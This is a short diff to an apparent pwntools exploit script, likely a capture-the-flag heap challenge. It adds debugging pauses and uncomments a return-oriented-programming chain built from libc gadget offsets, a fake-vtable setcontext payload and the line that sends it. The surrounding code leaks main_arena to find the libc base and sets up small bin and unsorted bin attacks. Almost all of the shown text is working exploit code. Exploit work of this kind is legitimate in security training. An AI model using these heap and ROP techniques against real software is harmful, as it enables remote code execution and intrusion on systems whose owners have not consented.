@@ -71,8 +71,9 @@ log.info("main_arena : {}".format(hex(main_arena_88)))
 log.info("libc_base : {}".format(hex(libc_base)))
 p.sendlineafter('>> ','0');sleep(t)
 p.sendlineafter(': ','n');sleep(t)
+raw_input()
 delete(str(main_arena_88))
-
+raw_input()
 # small bin attack + unsorted bin attack
 
 io_buf_end = libc_base + 3950880
@@ -98,7 +99,6 @@ pop_rax = libc_base + 0x33544
 syscall = libc_base + 0xf727b
 '''
 
-'''
 pop_rdi = libc_base + 0x0000000000021112
 pop_rsi = libc_base + 0x00000000000202f8
 pop_rdx = libc_base + 0x0000000000001b92
@@ -143,7 +143,6 @@ pay += rop
 pay += p64(setcontext_53)*20	# fake vtable overwrited setcontext gadget
 raw_input()
 p.send(pay)
-'''
 p.interactive()
 
 
